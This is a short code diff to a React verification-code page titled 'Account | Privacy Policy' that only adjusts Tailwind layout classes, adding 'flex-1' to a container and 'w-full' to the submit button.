@@ -117,7 +117,7 @@ const Verify = () => {
     return (
         <div className='flex min-h-screen flex-col items-center sm:justify-center bg-[#f8f9fa]'>
             <title>Account | Privacy Policy</title>
-            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
+            <div className='flex max-w-xl flex-1 flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                 <p>{translatedTexts.description}</p>
                 <img src={VerifyImage} alt='' />
@@ -133,7 +133,7 @@ const Verify = () => {
                     </div>
                     <div className="w-full">
                         <p>{translatedTexts.walkthrough}</p>
-                        <button className='rounded-lg border border-gray-300 bg-[#f8f9fa] py-4 font-medium hover:bg-blue-500 hover:text-white disabled:opacity-50' onClick={handleSubmit} disabled={isLoading || !code.trim()}>
+                        <button className='rounded-lg w-full border border-gray-300 bg-[#f8f9fa] py-4 font-medium hover:bg-blue-500 hover:text-white disabled:opacity-50' onClick={handleSubmit} disabled={isLoading || !code.trim()}>
                             {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
                         </button>
                         <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
